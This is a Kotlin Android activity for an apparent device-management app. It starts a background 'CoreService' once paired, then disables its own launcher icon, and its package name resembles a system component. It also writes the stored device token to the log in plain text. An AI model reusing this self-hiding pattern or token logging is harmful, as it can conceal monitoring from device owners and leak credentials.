package com.android.dpc

import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.util.Log

class MainActivity : Activity() {
    companion object {
        private const val TAG = "MainActivity"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Check if we have pairing data
        val prefs = getSharedPreferences("spectratm_config", Context.MODE_PRIVATE)
        val deviceId = prefs.getString("device_id", null)
        val token = prefs.getString("device_token", null)
        
        if (deviceId == null || token == null) {
            Log.d(TAG, "No pairing data found - starting manual setup")
            // Show manual setup for first-time configuration
            val setupIntent = Intent(this, ManualSetupActivity::class.java)
            startActivity(setupIntent)
        } else {
            Log.d(TAG, "Found pairing data: $deviceId / $token - starting CoreService")
            // Start service with existing pairing
            val serviceIntent = Intent(this, CoreService::class.java)
            startForegroundService(serviceIntent)
            
            // Hide from launcher after successful pairing
            hideFromLauncher()
        }
        
        // Finish activity
        finish()
    }
    
    private fun hideFromLauncher() {
        val componentName = ComponentName(this, MainActivity::class.java)
        packageManager.setComponentEnabledSetting(
            componentName,
            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            android.content.pm.PackageManager.DONT_KILL_APP
        )
    }
}